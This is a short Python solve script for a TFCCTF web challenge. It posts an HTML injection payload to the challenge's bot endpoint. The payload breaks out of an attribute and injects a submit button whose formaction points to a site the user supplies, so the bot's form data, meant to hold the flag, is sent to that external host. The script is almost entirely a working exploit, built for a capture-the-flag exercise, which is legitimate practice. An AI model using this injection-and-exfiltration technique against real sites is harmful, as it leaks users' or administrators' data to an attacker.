#!/usr/bin/env python3
import requests, os

BASEURL = f"http://challs.tfcctf.com:{input('Enter the port: ')}/"
REGEX = r"TFCCTF{.*?}"
PAYLOAD = f"""
"><input type="submit" formaction="{input('Enter the url of your site: ')}" name="st1lln0fl4g"><label name="
"""

resp = requests.post(f"{BASEURL}/bot", data={"fields":PAYLOAD})
print("Check the requests to your site, the flag will be in a POST request")